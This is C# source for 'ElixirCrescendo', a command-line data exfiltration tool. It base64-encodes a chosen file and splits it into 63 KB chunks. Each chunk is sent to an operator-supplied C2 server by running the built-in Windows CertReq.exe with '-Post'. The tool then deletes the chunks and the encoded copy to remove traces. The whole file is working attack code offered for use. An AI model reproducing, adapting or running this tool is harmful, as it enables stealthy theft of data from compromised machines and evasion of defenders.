using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace elixircrescendo
{
    class Program
    {
        public static void ECheader()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("  *  *  * ElixirCrescendo *  *  *");
            Console.WriteLine(@"      _    ____  _  __");
            Console.WriteLine(@"     / \  |  _ \| |/ /");
            Console.WriteLine(@"    / _ \ | |_) | ' / ");
            Console.WriteLine(@"   / ___ \|  __/| . \ ");
            Console.WriteLine(@"  /_/   \_\_|   |_|\_\");
            Console.WriteLine("  --CertReq.exe Exfil Wrapper--");
            Console.WriteLine(" ");
            Console.ResetColor();
        }

        public static void Help()
        {
            ECheader();

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Example: ");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("    C:\\>ElixirCrescendo.exe \"C:\\CoolFolder\\juicy_file.zip\"");
            Console.ResetColor();
            Environment.Exit(1);
        }

        private static void SplitFile(string inputFile, int chunkSize, string path, string Xc2)
        {
            byte[] buffer = new byte[chunkSize];

            using (Stream input = File.OpenRead(inputFile))
            {
                int index = 0;
                Console.WriteLine("[+] Chunking up payload and sending with CertReq!");
                while (input.Position < input.Length)
                {
                    string cind = Path.Combine(path, index.ToString());
                    using (Stream output = File.Create(cind))
                    {
                        int chunkBytesRead = 0;
                        while (chunkBytesRead < chunkSize)
                        {
                            int bytesRead = input.Read(buffer,
                                                   chunkBytesRead,
                                                   chunkSize - chunkBytesRead);

                            if (bytesRead == 0)
                            {
                                break;
                            }
                            chunkBytesRead += bytesRead;
                        }
                        output.Write(buffer, 0, chunkBytesRead);

                        System.Threading.Thread.Sleep(800);

                        Process process = new Process
                        {
                            StartInfo =
                            {
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                CreateNoWindow = true,
                                FileName = "CertReq.exe",
                                Arguments = "-Post -config " + Xc2 + " " + cind
                            }
                        };
                        process.Start();
                    }

                    index++;
                    System.Threading.Thread.Sleep(200);
                }
                Console.WriteLine("[+] Payload has been exfil'ed!..cleaning up..");
                Clean(index, path);
            }
        }

        private static void Clean(int index, string path)
        {
            foreach (int i in Enumerable.Range(0, index))
            {
                string fileToDelete = Path.Combine(path, i.ToString());
                if (File.Exists(fileToDelete))
                {
                    File.Delete(fileToDelete);
                    System.Threading.Thread.Sleep(100);
                }
            }
            Console.WriteLine("[+] Deleting 63kb chunks and serialized payload...");
            System.Threading.Thread.Sleep(2000);
        }

        static void Main(string[] args)
        {
            try
            {
                if (args.Length != 1)
                {
                    Help();
                    return;
                }

                ECheader();

                // Prompt user for IP address
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("[+] Enter C2 server IP address (e.g., http://192.168.1.100/): ");
                Console.ResetColor();
                string Xc2 = Console.ReadLine();

                // Validate the input
                if (string.IsNullOrWhiteSpace(Xc2))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[-] Error: IP address cannot be empty!");
                    Console.ResetColor();
                    return;
                }

                // Ensure the URL ends with /
                if (!Xc2.EndsWith("/"))
                {
                    Xc2 += "/";
                }

                string Xfile = args[0];

                // Verify the input file exists
                if (!File.Exists(Xfile))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[-] Error: Input file not found: " + Xfile);
                    Console.ResetColor();
                    return;
                }

                int chunkSize = 63000;
                Console.WriteLine("[+] Serializing your ingredient into an Elixir!");
                System.Threading.Thread.Sleep(500);

                Byte[] bytes = File.ReadAllBytes(Xfile);
                string bcon = Convert.ToBase64String(bytes);

                string tempDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string inputFile = Path.Combine(tempDir, "b64.txt");
                string path = tempDir;

                File.WriteAllText(inputFile, bcon);

                SplitFile(inputFile, chunkSize, path, Xc2);

                if (File.Exists(inputFile))
                {
                    File.Delete(inputFile);
                }

                Console.WriteLine("[+] Done!");
                Console.WriteLine("[!] Now just base64 decode your exfil'ed juice to its original form");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Error: " + ex.Message);
                Console.ResetColor();
            }
        }
    }
}
